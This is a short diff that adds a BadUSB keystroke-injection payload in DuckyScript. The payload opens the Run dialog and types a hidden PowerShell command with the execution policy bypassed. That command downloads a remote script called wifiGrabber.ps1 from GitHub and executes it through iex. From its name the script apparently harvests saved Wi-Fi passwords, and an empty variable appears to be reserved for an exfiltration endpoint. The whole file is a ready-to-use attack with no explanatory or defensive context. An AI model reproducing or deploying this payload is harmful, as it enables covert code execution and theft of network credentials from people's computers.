@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='';irm https://raw.githubusercontent.com/dldygnl/BadUsbScripts/refs/heads/main/wifi-grabber/wifiGrabber.ps1 | iex
+ENTER
